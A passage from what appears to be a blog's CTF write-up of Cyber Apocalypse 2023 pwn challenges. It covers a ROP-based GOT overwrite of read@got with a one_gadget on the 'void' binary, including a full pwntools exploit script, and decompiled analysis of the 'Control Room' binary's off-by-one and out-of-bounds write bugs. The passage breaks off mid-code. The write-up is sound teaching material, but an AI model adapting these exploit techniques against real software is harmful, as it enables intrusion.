2</h3><p>later i got to know the another way to solve this challenge from writeup after end of CTF<br>it is cool and efficient way exploit binary (atleast for me) lets understand how.</p><p>while searching for gadgets there are some interesting gadgets that we can leverage to exploit binary </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x00401108: add [rbp-<span class="number">0</span>x3d], ebx; nop <span class="selector-attr">[rax+rax]</span>; ret;</span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line"><span class="number">0</span>x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure><blockquote><p>use <a href="https://github.com/Ben-Lichtman/ropr">ropr</a> by Ben-Lichtman as i was having problem to get these gadgets with ropper and ROPgadget i don’t why?</p></blockquote><p>The instruction “add [rbp-0x3d], ebx” performs an addition operation between the value in the register “ebx” and the value at the memory address pointed to by the register “rbp” minus 0x3d (61 in decimal).</p><p>In other words, this instruction adds the value in “ebx” to the value stored at the address “rbp-0x3d” in memory. The result is then stored back at the same memory address.</p><p>“nop [rax+rax]” - This instruction is a no-operation (nop), which means it does nothing.<br>so it wont bother us.</p><p>if we manage control the <strong>rbp-0x3d</strong> memory location and <strong>ebx</strong> register we can write any target function at <strong>rbp-0x3d</strong> memory location with <strong>ebx</strong> register, for that we have need gadgets to control the rbp and rbx register and we have got see above codeblock.</p><p>so what we will be doing is first off, parse the <strong>read@got</strong> addr to rbp register with adding <strong>0x3d</strong> extra byte so that we can get exact addr of <strong>read@got</strong> (rbp-0x3d) + 0x3d) and then parse the target address to <strong>rbx</strong> register. <strong>YES</strong> we are doing GOT overwrite here, since we would have overwritten read@got addr on got table calling read func next time will jump to the target address we overwritten. 😉</p><blockquote><p>since the addresses of the functions in the GOT table are fixed as we PIE disabled here, hence we know the exact address of the function we want to overwrite in the GOT table. In PIE-enabled binaries, the addresses of the functions in the GOT table are randomized at runtime, making it much more difficult to know the exact address of the function to overwrite.</p></blockquote><p>and target address we are going to overwrite read@got with is one_gadget </p><p><img src="/imgs/post3/pwn/void_one_gadget.png" alt="void_one_gadget"></p><p>we have to Keep an eye on constraints of one_gadget address as we have already control on<br>r12 and r13 register </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure><p>we do not need to bother of value being changed </p><h3 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./void&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">p = process()</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004011b9</span></span><br><span class="line">add_gadget = <span class="number">0x0000000000401108</span> <span class="comment"># add [rbp-0x3d], ebx; nop [rax+rax]; ret;</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x004011b2</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">72</span>) </span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15) + p64(<span class="number">0xfffdce9a</span>) + p64(read_got+<span class="number">0x3d</span>) + p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(add_gadget)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>here 0xfffdce9a is negative representation of one_gagdget offet as we are using add gadget so if we want to decrease to reach read GOT we have to add with negative value<br>same as 0xc961a - libc.sym[‘read’] </p></blockquote><p><img src="/imgs/post3/pwn/void_op2.png" alt="void_op2"></p><h2 id="Control-Room"><a href="#Control-Room" class="headerlink" title="Control Room"></a>Control Room</h2><p><img src="/imgs/post3/pwn/control_room.jpg" alt="control_room"></p><p>couldn’t solve this challenge at competition time. However, after reading wirteup found so interesting that couldn’t stop me to write own one.</p><p>Writeup : <a href="https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/#control-room">https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/#control-room</a> </p><p>binary has several of function with full of bugs that need to be chain together to gain shell, we have to analyze it sequentially </p><p>lets run the binary and have static look</p><p><img src="/imgs/post3/pwn/control_room_patch.png" alt="control_room_patch"></p><blockquote><p>make sure to patch the binary first </p></blockquote><p><img src="/imgs/post3/pwn/control_room_menu.png" alt="control_room_menu"></p><p>asking for username registration, confirmation and have roles and function accordingly and current role is set to Crew </p><p><img src="/imgs/post3/pwn/control_room_menu2.png" alt="control_room_menu2"></p><p>if we want to change the username binary ask for new username size that can’t be larger than the current username and also cant choose any option as it require role to technician and captain accordingly.</p><p><em><strong>Lets see what Ghidra says</strong></em></p><p>main function :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">size_t</span> sVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  setup();</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  user_register();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nAre you sure about your username choice? (y/n)&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_14,<span class="number">4</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  sVar2 = <span class="built_in">strcspn</span>((<span class="type">char</span> *)&amp;local_14,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  *(undefined *)((<span class="type">long</span>)&amp;local_14 + sVar2) = <span class="number">0</span>;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)&amp;local_14,<span class="string">&quot;y&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    log_message(<span class="number">0</span>,<span class="string">&quot;User registered successfully.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    user_edit();</span><br><span class="line">  &#125;</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>in main first <code>setup</code> and <code>user_register</code> being called and then if user choice is “n” <code>user_edit</code> function and finally <code>menu</code> function , let analyse one by one </p><p>setup function :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  read_banner();</span><br><span class="line">  <span class="built_in">memset</span>(engines,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  curr_user = <span class="built_in">malloc</span>(<span class="number">0x110</span>);</span><br><span class="line">  *(undefined4 *)((<span class="type">long</span>)curr_user + <span class="number">0x100</span>) = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>engines</code> array is initialized to all 0’s, with a length of 0x80 (128 bytes).<br>Next, a block of memory is allocated with the <code>malloc()</code> function, with a size of 0x110 (272 bytes). The address of the allocated block is stored in the <code>curr_user</code> pointer.</p><p>the value 2 is stored in the allocated block of memory, starting at an offset of 0x100.</p><p>Overall, this code sets up some basic memory and I&#x2F;O configurations for a program, and allocates a block of memory for storing some user data.</p><p>user_register function :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">user_register</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> sVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;===[ Register ]===&gt;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a username: &quot;</span>);</span><br><span class="line">  read_input(&amp;local_118,<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(curr_user,(<span class="type">char</span> *)&amp;local_118,<span class="number">0x100</span>);</span><br><span class="line">  sVar1 = <span class="built_in">strlen</span>(curr_user);</span><br><span class="line">  *(<span class="type">size_t</span> *)(curr_user + <span class="number">0x108</span>) = sVar1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this function read the given username and store it to address pointed by  local_188 vairable which is of 0x100(256) size and then username is being copied to global username curr_user as well as as length of the username string plus one at an offset of <code>0x108</code> bytes from the start of the <code>curr_user</code> buffer</p><p>user_edit function :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">user_edit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> user_length;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">  <span class="type">size_t</span> idx;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;===[ Edit Username ]===&gt;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New username size: &quot;</span>);</span><br><span class="line">  user_length = read_num();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> (*(ulong *)(curr_user + <span class="number">0x108</span>) &lt; (ulong)(<span class="type">long</span>)user_length) &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Can\&#x27;t be larger than the current username.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>((<span class="type">long</span>)(user_length + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (buf == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      log_message(<span class="number">3</span>,<span class="string">&quot;Please replace the memory catridge.&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,(<span class="type">long</span>)(user_length + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nEnter your new username: &quot;</span>);</span><br><span class="line">    fgets(buf,user_length,<span class="built_in">stdin</span>);</span><br><span class="line">    idx = <span class="built_in">strcspn</span>(buf,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    buf[idx] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(curr_user,buf,(<span class="type">long</span>)(user_length + <span class="number">1</span>));</span><br><span class="line">    log_message(<span class="number">0</span>,<span class="string">&quot;User updated successfully!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>function  <code>user_edit</code>  is responsible for allowing a user to edit their username.</p><p>working of this funciton : </p><ul><li>initially it ask for size of new username that being stored in user_length variable by <code>read_num</code> function </li><li>condition to verify user_length cant be larger than current username(as you can see “curr_user + 0x108” is lenght of curr_user itself i.e. current username)</li><li>allocate block of memory(user_length+1) to char array <strong>buf</strong> </li><li>and then <code>memset</code> functionset “user_length + 1” bytes of memory starting from the address pointed to by “buf” to zero.</li></ul><p>we have Off By One bug in this block of code, if you see at <strong>if condition</strong> it only check user_length shouldn’t be greater than curr_user but can be equal i.e. 0x100(256).<br>as curr_user size is 0x100 itself while setting the “user_length + 1” number of zero’s to buf at <code>memset</code> function it is going to set 257 byte of null, which mean it will write one null byte beyond the curr_user username that allows us to switch our role from Crew to Captain lets see how</p><p>menu function: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    print_current_role();</span><br><span class="line">    uVar1 = read_option(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;selection: %d\n&quot;</span>,(ulong)uVar1);</span><br><span class="line">    <span class="keyword">switch</span>(uVar1) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      log_message(<span class="number">3</span>,<span class="string">&quot;Invalid option\n&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      configure_engine();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      check_engines();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      change_route();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      view_route();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      change_role();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inside menu function we do have other function lets jump to <code>print_current_role</code> first </p><p>print_current_role function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print_current_role</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  </span><br><span class="line">  iVar1 = *(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">2</span>) &#123;</span><br><span class="line">    log_message(<span class="number">1</span>,<span class="string">&quot;Current Role: Crew\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> &lt; iVar1) &#123;</span><br><span class="line">LAB_00401fd1:</span><br><span class="line">      log_message(<span class="number">3</span>,<span class="string">&quot;How did you get here?!\n&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0x539</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      log_message(<span class="number">1</span>,<span class="string">&quot;Current Role: Captain\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) <span class="keyword">goto</span> LAB_00401fd1;</span><br><span class="line">      log_message(<span class="number">1</span>,<span class="string">&quot;Current Role: Technician\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>function first reads the value of the “curr_user” global variable at offset 0x100, so if you remember in function <code>setup</code> “curr_user + 0x100” is assigned to 2.<br>It then uses a series of if&#x2F;else statements to determine the user’s role based on the value of this integer.</p><p>If the integer value is equal to 2, the function logs a message indicating that the user’s current role is “Crew”. If the integer value is equal to 0, the function logs a message indicating that the user’s current role is “Captain”. If the integer value is equal to 1, the function logs a message indicating that the user’s current role is “Technician”.</p><p>so if “curr+user + 0x100” is</p><ul><li>0 &#x3D;&gt; Captain</li><li>1 &#x3D;&gt; Technician</li><li>2 &#x3D;&gt; Crew - current role</li></ul><p>Using Off-ByOne write we can set “curr_user + 0x100”  to 0 i.e. Captain </p><p>Configure_engine function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">configure_engine</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint num;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">size_t</span> sVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined2 local_13;</span><br><span class="line">  undefined local_11;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_13 = <span class="number">0</span>;</span><br><span class="line">  local_11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nEngine number [0-%d]: &quot;</span>,<span class="number">3</span>);</span><br><span class="line">    num = read_num();</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">int</span>)num &lt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Engine [%d]: \n&quot;</span>,(ulong)num);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\tThrust: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;DAT_0040330e,&amp;local_28);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\tMixture ratio: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;DAT_0040330e,&amp;local_20);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDo you want to save the configuration? (y/n) &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&gt; &quot;</span>);</span><br><span class="line">    fgets((<span class="type">char</span> *)&amp;local_13,<span class="number">3</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    sVar2 = <span class="built_in">strcspn</span>((<span class="type">char</span> *)&amp;local_13,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    *(undefined *)((<span class="type">long</span>)&amp;local_13 + sVar2) = <span class="number">0</span>;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)&amp;local_13,<span class="string">&quot;y&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      *(undefined8 *)(engines + (<span class="type">long</span>)(<span class="type">int</span>)num * <span class="number">0x10</span>) = local_28;</span><br><span class="line">      *(undefined8 *)(engines + (<span class="type">long</span>)(<span class="type">int</span>)num * <span class="number">0x10</span> + <span class="number">8</span>) = local_20;</span><br><span class="line">      log_message(<span class="number">0</span>,<span class="string">&quot;Engine configuration updated successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      log_message(<span class="number">1</span>,<span class="string">&quot;Engine configuration cancelled.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only technicians are allowed to configure the engines&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>as this function about engine we need to switch Technician role,<br>the <code>undefined8</code> data type used for <code>local_28</code>  and <code>local_20</code> can hold both signed and unsigned values, as it is an undefined data type that represents an 8-byte (64-bit) value whose purpose or contents are unknown or undefined, resulting in an out-of-bounds write (precisely, buffer underflow write if i am not wrong) to the address preceding the engines.</p><p>check_engine function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_engines</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[===&lt; Engine Check &gt;===]&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (local_c = <span class="number">0</span>; local_c &lt; <span class="number">4</span>; local_c = local_c + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="number">100</span> &lt; *(<span class="type">long</span> *)(engines + (<span class="type">long</span>)local_c * <span class="number">0x10</span>)) ||</span><br><span class="line">         (<span class="number">100</span> &lt; *(<span class="type">long</span> *)(engines + (<span class="type">long</span>)local_c * <span class="number">0x10</span> + <span class="number">8</span>))) &#123;</span><br><span class="line">        log_message(<span class="number">3</span>,<span class="string">&quot;Faulty configuration found.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      